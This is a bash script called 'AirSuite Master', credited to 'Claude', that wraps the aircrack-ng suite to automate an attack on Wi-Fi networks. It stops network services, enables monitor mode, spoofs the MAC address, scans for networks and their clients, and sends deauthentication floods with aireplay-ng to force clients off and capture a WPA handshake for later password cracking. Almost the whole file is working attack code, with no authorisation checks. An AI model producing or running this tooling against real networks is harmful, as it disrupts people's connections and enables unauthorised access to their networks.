#!/bin/bash
#===================================================================================
# AirSuite Master - Advanced Aircrack-ng Suite Wrapper
# Author: Claude
# Version: 1.0.0
# Description: A comprehensive wrapper for Aircrack-ng suite that automates the
#              complete wireless attack workflow with robust error handling,
#              session management, and optimization.
#===================================================================================

# Global Configuration
SCRIPT_VERSION="1.0.0"
SCRIPT_NAME=$(basename "$0")
LOGS_DIR="${HOME}/.airsuite/logs"
CAPTURES_DIR="${HOME}/.airsuite/captures"
WORDLISTS_DIR="${HOME}/.airsuite/wordlists"
SESSION_DIR="${HOME}/.airsuite/sessions"
CONFIG_FILE="${HOME}/.airsuite/config"
DEFAULT_WORDLIST="${WORDLISTS_DIR}/rockyou.txt"
DEFAULT_INTERFACE=""
DEFAULT_CAPTURE_TIME=30
DEFAULT_DEAUTH_COUNT=5
LOG_FILE=""
SESSION_ID=""
MONITOR_INTERFACES=()
TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CHANNEL=""
CAPTURE_FILE=""
CLIENT_MAC=""
ATTACK_MODE=""
HANDSHAKE_CAPTURED=false
START_TIME=$(date +%s)
PROCESS_PIDS=()
KILLED_SERVICES=()

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

#===================================================================================
# Core Functions
#===================================================================================

# Command exists check
command_exists() {
    command -v "$1" &>/dev/null
}

# Create required directories
setup_directories() {
    mkdir -p "$LOGS_DIR" "$CAPTURES_DIR" "$WORDLISTS_DIR" "$SESSION_DIR"
    # Create timestamp-based log file
    SESSION_ID=$(date +"%Y%m%d_%H%M%S")
    LOG_FILE="${LOGS_DIR}/airsuite_${SESSION_ID}.log"
    touch "$LOG_FILE"
    # Create session file
    SESSION_FILE="${SESSION_DIR}/${SESSION_ID}.session"
    touch "$SESSION_FILE"
}

# Logging function
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    
    case "$level" in
        "INFO")
            echo -e "${GREEN}[${timestamp}] [INFO] ${message}${RESET}" | tee -a "$LOG_FILE"
            ;;
        "WARN")
            echo -e "${YELLOW}[${timestamp}] [WARN] ${message}${RESET}" | tee -a "$LOG_FILE"
            ;;
        "ERROR")
            echo -e "${RED}[${timestamp}] [ERROR] ${message}${RESET}" | tee -a "$LOG_FILE"
            ;;
        "DEBUG")
            if [[ "$VERBOSE" == "true" ]]; then
                echo -e "${BLUE}[${timestamp}] [DEBUG] ${message}${RESET}" | tee -a "$LOG_FILE"
            else
                echo -e "${BLUE}[${timestamp}] [DEBUG] ${message}${RESET}" >> "$LOG_FILE"
            fi
            ;;
        *)
            echo -e "[${timestamp}] ${message}" | tee -a "$LOG_FILE"
            ;;
    esac
}

# Save session state
save_session() {
    cat > "$SESSION_FILE" << EOF
ATTACK_MODE="$ATTACK_MODE"
TARGET_BSSID="$TARGET_BSSID"
TARGET_ESSID="$TARGET_ESSID"
TARGET_CHANNEL="$TARGET_CHANNEL"
CAPTURE_FILE="$CAPTURE_FILE"
HANDSHAKE_CAPTURED=$HANDSHAKE_CAPTURED
CLIENT_MAC="$CLIENT_MAC"
INTERFACE="$INTERFACE"
MONITOR_INTERFACE="${MONITOR_INTERFACES[0]}"
WORDLIST="$WORDLIST"
EOF
    log "DEBUG" "Session saved to $SESSION_FILE"
}

# Load session state
load_session() {
    if [[ -f "$1" ]]; then
        log "INFO" "Loading session from $1"
        source "$1"
        return 0
    else
        log "ERROR" "Session file $1 not found"
        return 1
    fi
}

# Display banner
show_banner() {
    clear
    cat << "EOF"
    _    _     ____       _ _         __  __           _            
   / \  (_)_ _/ ___| _   (_) |_ ___  |  \/  | __ _ ___| |_ ___ _ __ 
  / _ \ | | '__\___ \| | | | __/ _ \ | |\/| |/ _` / __| __/ _ \ '__|
 / ___ \| | |   ___) | |_| | ||  __/ | |  | | (_| \__ \ ||  __/ |   
/_/   \_\_|_|  |____/ \__,_|\__\___| |_|  |_|\__,_|___/\__\___|_|   
                                                                    
EOF
    echo -e "${BOLD}${CYAN}AirSuite Master v${SCRIPT_VERSION} - Advanced Aircrack-ng Suite Wrapper${RESET}"
    echo -e "${MAGENTA}====================================================================${RESET}"
}

# Check dependencies
check_dependencies() {
    local missing_deps=0
    local required_tools=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "macchanger" "iw")
    
    log "INFO" "Checking dependencies..."
    
    for tool in "${required_tools[@]}"; do
        if ! command_exists "$tool"; then
            log "ERROR" "Required tool not found: $tool"
            missing_deps=$((missing_deps + 1))
        else
            log "DEBUG" "Found required tool: $tool"
        fi
    done
    
    if [[ $missing_deps -gt 0 ]]; then
        log "ERROR" "Missing $missing_deps required dependencies"
        log "INFO" "Please install the full Aircrack-ng suite: sudo apt install aircrack-ng"
        exit 1
    else
        log "INFO" "All required dependencies are installed"
    fi
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log "ERROR" "This script must be run as root"
        echo -e "${RED}Please run with sudo or as root${RESET}"
        exit 1
    fi
}

# Get available wireless interfaces
get_interfaces() {
    local interfaces=()
    local iface_info=""
    
    log "DEBUG" "Scanning for wireless interfaces..."
    
    # Get interfaces from iw
    while read -r line; do
        if [[ $line == *"Interface "* ]]; then
            iface=$(echo "$line" | awk '{print $2}')
            interfaces+=("$iface")
        fi
    done < <(iw dev 2>/dev/null)
    
    # If no interfaces found with iw, try ip link
    if [[ ${#interfaces[@]} -eq 0 ]]; then
        while read -r line; do
            if [[ $line == *"wlan"* ]]; then
                iface=$(echo "$line" | awk -F: '{print $2}' | tr -d ' ')
                interfaces+=("$iface")
            fi
        done < <(ip link show 2>/dev/null | grep -v "mon")
    fi
    
    # Display available interfaces
    if [[ ${#interfaces[@]} -eq 0 ]]; then
        log "ERROR" "No wireless interfaces found"
        return 1
    else
        log "INFO" "Found ${#interfaces[@]} wireless interfaces"
        echo -e "\n${BOLD}Available wireless interfaces:${RESET}"
        
        for i in "${!interfaces[@]}"; do
            iface="${interfaces[$i]}"
            # Get MAC and driver info
            mac=$(ip link show "$iface" 2>/dev/null | grep -o 'link/ether [^ ]*' | cut -d' ' -f2)
            driver=$(ethtool -i "$iface" 2>/dev/null | grep driver | awk '{print $2}')
            power=$(iwconfig "$iface" 2>/dev/null | grep "Tx-Power" | sed 's/.*Tx-Power=//' | awk '{print $1}')
            
            if [[ -z "$power" ]]; then
                power="N/A"
            fi
            
            echo -e "${BOLD}${i}${RESET}: ${CYAN}${iface}${RESET} (MAC: ${YELLOW}${mac}${RESET}, Driver: ${GREEN}${driver}${RESET}, Tx-Power: ${MAGENTA}${power}${RESET})"
        done
        
        # Let user choose or use default
        if [[ ${#interfaces[@]} -eq 1 ]]; then
            INTERFACE="${interfaces[0]}"
            log "INFO" "Using the only available interface: $INTERFACE"
        elif [[ -n "$DEFAULT_INTERFACE" ]] && [[ " ${interfaces[*]} " == *" $DEFAULT_INTERFACE "* ]]; then
            INTERFACE="$DEFAULT_INTERFACE"
            log "INFO" "Using default interface: $INTERFACE"
        else
            echo -e "\n${BOLD}Select interface by number [0-$((${#interfaces[@]}-1))]${RESET}:"
            read -r choice
            
            if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -lt "${#interfaces[@]}" ]]; then
                INTERFACE="${interfaces[$choice]}"
                log "INFO" "Selected interface: $INTERFACE"
            else
                log "ERROR" "Invalid selection, using first interface"
                INTERFACE="${interfaces[0]}"
            fi
        fi
        
        return 0
    fi
}

# Function to kill conflicting processes
kill_processes() {
    log "INFO" "Checking for conflicting processes..."
    
    # Use airmon-ng to check
    conflicts=$(airmon-ng check | grep -v "^PHY" | grep -v "^Interface" | awk '{print $2}')
    
    if [[ -n "$conflicts" ]]; then
        log "WARN" "Found conflicting processes. Stopping them..."
        
        for process in NetworkManager wpa_supplicant dhclient dhcpcd wpa_cli hostapd; do
            pids=$(pgrep -f "$process")
            if [[ -n "$pids" ]]; then
                log "DEBUG" "Killing $process (PIDs: $pids)"
                for pid in $pids; do
                    kill -9 "$pid" 2>/dev/null
                    if [[ $? -eq 0 ]]; then
                        KILLED_SERVICES+=("$process")
                        log "DEBUG" "Killed process $process (PID: $pid)"
                    fi
                done
            fi
        done
        
        # Alternative: Use airmon-ng check kill
        # airmon-ng check kill >> "$LOG_FILE" 2>&1
        # log "INFO" "Killed conflicting processes using airmon-ng"
        
        sleep 1
    else
        log "INFO" "No conflicting processes found"
    fi
}

# Function to enable monitor mode
enable_monitor_mode() {
    log "INFO" "Enabling monitor mode on $INTERFACE..."
    
    # First try with airmon-ng
    monitor_result=$(airmon-ng start "$INTERFACE" 2>&1)
    log "DEBUG" "Monitor mode result: $monitor_result"
    
    # Check if monitor mode was enabled and get the name
    if echo "$monitor_result" | grep -q "monitor mode enabled"; then
        # Try to extract from airmon-ng output first
        mon_iface=$(echo "$monitor_result" | grep -o "$INTERFACE mon\|${INTERFACE}mon\|mon[0-9]\+")
        
        # If that fails, check iw dev output
        if [[ -z "$mon_iface" ]]; then
            mon_iface=$(iw dev | grep -A 1 "Interface $INTERFACE" | grep -o "mon[0-9]\+\|${INTERFACE}mon")
        fi
        
        # If still not found, try to find any monitor interface
        if [[ -z "$mon_iface" ]]; then
            mon_iface=$(iw dev | grep Interface | grep mon | awk '{print $2}' | head -n 1)
        fi
        
        if [[ -n "$mon_iface" ]]; then
            MONITOR_INTERFACES+=("$mon_iface")
            log "INFO" "Monitor mode enabled on $mon_iface"
        else
            # Try alternative method
            log "WARN" "Failed to detect monitor interface, trying alternative method..."
            mon_iface="${INTERFACE}mon"
            iw dev "$INTERFACE" interface add "$mon_iface" type monitor
            if [[ $? -eq 0 ]]; then
                MONITOR_INTERFACES+=("$mon_iface")
                log "INFO" "Created monitor interface $mon_iface using iw"
                ip link set "$mon_iface" up
            else
                # Last resort - try to set the interface directly to monitor mode
                log "WARN" "Failed to create monitor interface, trying direct method..."
                ip link set "$INTERFACE" down
                iw dev "$INTERFACE" set type monitor
                ip link set "$INTERFACE" up
                if iw dev | grep -q "type monitor"; then
                    MONITOR_INTERFACES+=("$INTERFACE")
                    log "INFO" "Set $INTERFACE directly to monitor mode"
                else
                    log "ERROR" "All methods to enable monitor mode failed"
                    return 1
                fi
            fi
        fi
    else
        log "WARN" "airmon-ng failed to enable monitor mode, trying alternative method..."
        # Try alternative method with iw
        mon_iface="${INTERFACE}mon"
        iw dev "$INTERFACE" interface add "$mon_iface" type monitor
        if [[ $? -eq 0 ]]; then
            MONITOR_INTERFACES+=("$mon_iface")
            log "INFO" "Created monitor interface $mon_iface using iw"
            ip link set "$mon_iface" up
        else
            log "ERROR" "Failed to enable monitor mode on $INTERFACE"
            return 1
        fi
    fi
    
    # Verify monitor mode is working
    if [[ ${#MONITOR_INTERFACES[@]} -gt 0 ]]; then
        for mon_if in "${MONITOR_INTERFACES[@]}"; do
            if iw dev "$mon_if" info 2>/dev/null | grep -q "type monitor"; then
                log "INFO" "Verified monitor mode on $mon_if"
                # Set a random MAC address for the monitor interface (optional)
                if command_exists "macchanger"; then
                    log "DEBUG" "Changing MAC address of $mon_if..."
                    ip link set "$mon_if" down
                    macchanger -r "$mon_if" >> "$LOG_FILE" 2>&1
                    ip link set "$mon_if" up
                    new_mac=$(macchanger -s "$mon_if" | grep "Current MAC" | awk '{print $3}')
                    log "INFO" "Changed MAC address to $new_mac"
                fi
                return 0
            fi
        done
    fi
    
    log "ERROR" "Failed to verify monitor mode"
    return 1
}

# Function to disable monitor mode and cleanup
disable_monitor_mode() {
    log "INFO" "Disabling monitor mode..."
    
    for mon_if in "${MONITOR_INTERFACES[@]}"; do
        if [[ -n "$mon_if" ]]; then
            log "DEBUG" "Stopping monitor mode on $mon_if..."
            
            # Try airmon-ng first
            airmon-ng stop "$mon_if" >> "$LOG_FILE" 2>&1
            
            # If that fails, try iw
            if iw dev | grep -q "$mon_if"; then
                log "DEBUG" "Using iw to remove monitor interface $mon_if..."
                iw dev "$mon_if" del >> "$LOG_FILE" 2>&1
            fi
            
            log "INFO" "Disabled monitor mode on $mon_if"
        fi
    done
    
    # Reset monitor interfaces array
    MONITOR_INTERFACES=()
    
    # Try to restore wifi interface
    if [[ -n "$INTERFACE" ]]; then
        ip link set "$INTERFACE" up 2>/dev/null
    fi
}

# Cleanup function
cleanup() {
    log "INFO" "Starting cleanup process..."
    
    # Kill any running processes
    for pid in "${PROCESS_PIDS[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            log "DEBUG" "Killing process PID: $pid"
            kill -9 "$pid" 2>/dev/null
        fi
    done
    
    # Disable monitor mode
    disable_monitor_mode
    
    # Restart network services if they were killed
    for service in "${KILLED_SERVICES[@]}"; do
        log "INFO" "Restarting $service..."
        if [[ "$service" == "NetworkManager" ]]; then
            systemctl restart NetworkManager >> "$LOG_FILE" 2>&1
        elif [[ "$service" == "wpa_supplicant" ]]; then
            systemctl restart wpa_supplicant >> "$LOG_FILE" 2>&1
        elif [[ "$service" == "dhclient" || "$service" == "dhcpcd" ]]; then
            if command_exists "dhclient"; then
                dhclient "$INTERFACE" >> "$LOG_FILE" 2>&1
            elif command_exists "dhcpcd"; then
                dhcpcd "$INTERFACE" >> "$LOG_FILE" 2>&1
            fi
        fi
    done
    
    # Save session before exiting
    save_session
    
    END_TIME=$(date +%s)
    DURATION=$((END_TIME - START_TIME))
    log "INFO" "Script execution completed in $DURATION seconds"
    
    # Exit only if explicitly requested
    if [[ "$1" == "exit" ]]; then
        exit "${2:-0}"
    fi
}

#===================================================================================
# Network Scanning Functions
#===================================================================================

# Function to scan for wireless networks
scan_networks() {
    local mon_if="${MONITOR_INTERFACES[0]}"
    local temp_file="${CAPTURES_DIR}/scan_${SESSION_ID}.csv"
    
    log "INFO" "Scanning for wireless networks..."
    echo -e "\n${BOLD}Press Ctrl+C to stop scanning when target appears${RESET}\n"
    
    # Start airodump-ng in a separate process
    airodump-ng --output-format csv -w "$temp_file" "$mon_if" >> "$LOG_FILE" 2>&1 &
    SCAN_PID=$!
    PROCESS_PIDS+=($SCAN_PID)
    
    # Wait for user to press Ctrl+C
    trap 'kill $SCAN_PID 2>/dev/null; break' SIGINT
    while kill -0 $SCAN_PID 2>/dev/null; do
        sleep 1
    done
    trap - SIGINT
    
    # Process the scan results
    if [[ -f "${temp_file}-01.csv" ]]; then
        log "INFO" "Processing scan results..."
        
        # Extract network information from CSV
        # Skip header, filter out networks with empty ESSID
        networks=$(grep -a "," "${temp_file}-01.csv" | grep -v "BSSID" | grep -v "Station MAC" | sort -t, -k4 -nr)
        
        if [[ -n "$networks" ]]; then
            echo -e "\n${BOLD}Found Networks:${RESET}"
            echo -e "${BOLD}ID\tBSSID\t\t\tCH\tPWR\tENC\tESSID${RESET}"
            echo -e "-------------------------------------------------------------------------"
            
            # Counter for network IDs
            local count=0
            
            # Process each line
            while IFS= read -r line; do
                # Extract fields from CSV
                bssid=$(echo "$line" | cut -d, -f1 | tr -d ' ')
                first_time=$(echo "$line" | cut -d, -f2 | tr -d ' ')
                last_time=$(echo "$line" | cut -d, -f3 | tr -d ' ')
                channel=$(echo "$line" | cut -d, -f4 | tr -d ' ')
                speed=$(echo "$line" | cut -d, -f5 | tr -d ' ')
                privacy=$(echo "$line" | cut -d, -f6 | tr -d ' ')
                cipher=$(echo "$line" | cut -d, -f7 | tr -d ' ')
                auth=$(echo "$line" | cut -d, -f8 | tr -d ' ')
                power=$(echo "$line" | cut -d, -f9 | tr -d ' ')
                beacons=$(echo "$line" | cut -d, -f10 | tr -d ' ')
                ivs=$(echo "$line" | cut -d, -f11 | tr -d ' ')
                lan_ip=$(echo "$line" | cut -d, -f12 | tr -d ' ')
                id_len=$(echo "$line" | cut -d, -f13 | tr -d ' ')
                essid=$(echo "$line" | cut -d, -f14 | tr -d ' ')
                
                # Skip if ESSID is empty
                if [[ -n "$essid" ]]; then
                    # Format power value
                    if [[ "$power" == "-1" ]]; then
                        power="N/A"
                    else
                        power="${power}dBm"
                    fi
                    
                    # Format privacy
                    enc=$(echo "$privacy" | cut -d' ' -f1)
                    
                    # Display networks
                    echo -e "${count}\t${CYAN}${bssid}${RESET}\t${channel}\t${power}\t${YELLOW}${enc}${RESET}\t${GREEN}${essid}${RESET}"
                    
                    # Store network info in an array
                    network_info[$count]="${bssid},${channel},${essid}"
                    
                    ((count++))
                fi
            done <<< "$networks"
            
            # Let user select a target network
            echo -e "\n${BOLD}Select target network by ID [0-$((count-1))]${RESET}:"
            read -r target_id
            
            if [[ "$target_id" =~ ^[0-9]+$ ]] && [[ "$target_id" -lt "$count" ]]; then
                IFS=',' read -r TARGET_BSSID TARGET_CHANNEL TARGET_ESSID <<< "${network_info[$target_id]}"
                log "INFO" "Selected target: ESSID=$TARGET_ESSID, BSSID=$TARGET_BSSID, Channel=$TARGET_CHANNEL"
                
                # Set capture filename based on ESSID
                CAPTURE_FILE="${CAPTURES_DIR}/${TARGET_ESSID//[^a-zA-Z0-9]/_}_${SESSION_ID}"
                
                return 0
            else
                log "ERROR" "Invalid network selection"
                return 1
            fi
        else
            log "ERROR" "No networks found"
            return 1
        fi
    else
        log "ERROR" "Scan failed - no output file found"
        return 1
    fi
}

# Function to scan for clients
scan_clients() {
    local mon_if="${MONITOR_INTERFACES[0]}"
    local temp_file="${CAPTURES_DIR}/clients_${SESSION_ID}.csv"
    
    log "INFO" "Scanning for clients on $TARGET_ESSID (BSSID: $TARGET_BSSID, Channel: $TARGET_CHANNEL)..."
    echo -e "\n${BOLD}Press Ctrl+C to stop scanning when clients appear${RESET}\n"
    
    # Start airodump-ng focused on target network
    airodump-ng --output-format csv -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$temp_file" "$mon_if" >> "$LOG_FILE" 2>&1 &
    SCAN_PID=$!
    PROCESS_PIDS+=($SCAN_PID)
    
    # Wait for user to press Ctrl+C
    trap 'kill $SCAN_PID 2>/dev/null; break' SIGINT
    while kill -0 $SCAN_PID 2>/dev/null; do
        sleep 1
    done
    trap - SIGINT
    
    # Process the scan results
    if [[ -f "${temp_file}-01.csv" ]]; then
        log "INFO" "Processing client scan results..."
        
        # Extract client information from CSV
        clients=$(grep -a "Station MAC" -A 100 "${temp_file}-01.csv" | grep -v "Station MAC" | grep "$TARGET_BSSID")
        
        if [[ -n "$clients" ]]; then
            echo -e "\n${BOLD}Found Clients:${RESET}"
            echo -e "${BOLD}ID\tMAC Address\t\tPower\tPackets${RESET}"
            echo -e "-----------------------------------------------"
            
            # Counter for client IDs
            local count=0
            
            # Process each line
            while IFS= read -r line; do
                # Extract fields from CSV
                client_mac=$(echo "$line" | cut -d, -f1 | tr -d ' ')
                first_time=$(echo "$line" | cut -d, -f2 | tr -d ' ')
                last_time=$(echo "$line" | cut -d, -f3 | tr -d ' ')
                power=$(echo "$line" | cut -d, -f4 | tr -d ' ')
                packets=$(echo "$line" | cut -d, -f5 | tr -d ' ')
                bssid=$(echo "$line" | cut -d, -f6 | tr -d ' ')
                
                # Skip if client MAC is empty or not associated with target
                if [[ -n "$client_mac" && "$bssid" == "$TARGET_BSSID" ]]; then
                    # Format power value
                    if [[ "$power" == "-1" ]]; then
                        power="N/A"
                    else
                        power="${power}dBm"
                    fi
                    
                    # Display clients
                    echo -e "${count}\t${CYAN}${client_mac}${RESET}\t${power}\t${packets}"
                    
                    # Store client MAC in an array
                    client_macs[$count]="$client_mac"
                    
                    ((count++))
                fi
            done <<< "$clients"
            
            if [[ $count -eq 0 ]]; then
                log "WARN" "No active clients found"
                echo -e "\n${YELLOW}No clients found. Do you want to continue without a client? [y/N]${RESET}"
                read -r continue_choice
                if [[ "$continue_choice" =~ ^[Yy]$ ]]; then
                    CLIENT_MAC=""
                    return 0
                else
                    return 1
                fi
            else
                # Let user select a target client
                echo -e "\n${BOLD}Select target client by ID [0-$((count-1))] or 'a' for all:${RESET}"
                read -r target_client
                
                if [[ "$target_client" == "a" ]]; then
                    CLIENT_MAC="FF:FF:FF:FF:FF:FF"  # Broadcast
                    log "INFO" "Selected all clients (broadcast)"
                    return 0
                elif [[ "$target_client" =~ ^[0-9]+$ ]] && [[ "$target_client" -lt "$count" ]]; then
                    CLIENT_MAC="${client_macs[$target_client]}"
                    log "INFO" "Selected client: $CLIENT_MAC"
                    return 0
                else
                    log "ERROR" "Invalid client selection"
                    return 1
                fi
            fi
        else
            log "WARN" "No clients found"
            echo -e "\n${YELLOW}No clients found. Do you want to continue without a client? [y/N]${RESET}"
            read -r continue_choice
            if [[ "$continue_choice" =~ ^[Yy]$ ]]; then
                CLIENT_MAC=""
                return 0
            else
                return 1
            fi
        fi
    else
        log "ERROR" "Client scan failed - no output file found"
        return 1
    fi
}

#===================================================================================
# Attack Functions
#===================================================================================

# Function to capture handshake
capture_handshake() {
    local mon_if="${MONITOR_INTERFACES[0]}"
    local capture_duration=${1:-$DEFAULT_CAPTURE_TIME}
    local deauth_count=${2:-$DEFAULT_DEAUTH_COUNT}
    
    log "INFO" "Starting handshake capture on $TARGET_ESSID..."
    
    # Start capture in background
    log "DEBUG" "Starting airodump-ng on channel $TARGET_CHANNEL targeting $TARGET_BSSID"
    airodump-ng --output-format pcap,csv -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$CAPTURE_FILE" "$mon_if" >> "$LOG_FILE" 2>&1 &
    DUMP_PID=$!
    PROCESS_PIDS+=($DUMP_PID)
    
    sleep 2  # Give airodump-ng time to start
    
    if [[ -n "$CLIENT_MAC" ]]; then
        log "INFO" "Sending $deauth_count deauthentication packets to client $CLIENT_MAC..."
        
        # Deauthenticate the specific client
        aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$mon_if" >> "$LOG_FILE" 2>&1 &
        DEAUTH_PID=$!
        PROCESS_PIDS+=($DEAUTH_PID)
    else
        log "INFO" "No specific client targeted, sending broadcast deauthentication..."
        
        # Broadcast deauthentication
        aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" "$mon_if" >> "$LOG_FILE" 2>&1 &
        DEAUTH_PID=$!
        PROCESS_PIDS+=($DEAUTH_PID)
    fi
    
    # Display progress
    echo -e "\n${BOLD}Capturing handshake for ${capture_duration} seconds...${RESET}"
    for ((i=capture_duration; i>0; i--)); do
        echo -ne "\r${YELLOW}Time remaining: ${i} seconds${RESET}     "
        sleep 1
    done
    echo -e "\n"
    
    # Kill capture process
    if kill -0 $DUMP_PID 2>/dev/null; then
        kill $DUMP_PID 2>/dev/null
        wait $DUMP_PID 2>/dev/null
    fi
    
    # Kill deauth process if still running
    if kill -0 $DEAUTH_PID 2>/dev/null; then
        kill $DEAUTH_PID 2>/dev/null
        wait $DEAUTH_PID 2>/dev/null
    fi
    
    # Check if handshake was captured
    local pcap_file="${CAPTURE_FILE}-01.cap"
    if [[ -f "$pcap_file" ]]; then
        log "INFO" "Checking for handshake in $pcap_file..."
        if aircrack-ng "$pcap_file" | grep -q "1 handshake"; then
            log "INFO" "Handshake successfully captured!"
            HANDSHAKE_CAPTURED=true
            return 0
        else
            log "WARN" "No handshake found in $pcap_file"
            return 1
        fi
    else
        log "ERROR" "Capture file $pcap_file not found"
        return 1
    fi
}

# Main script logic
main() {
    setup_directories
    show_banner
    check_root
    check_dependencies
    get_interfaces
    kill_processes
    enable_monitor_mode
    scan_networks
    scan_clients
    capture_handshake
    cleanup exit
}

# Trap signals for cleanup
trap 'cleanup exit 1' SIGINT SIGTERM

# Execute main function
main "$@"
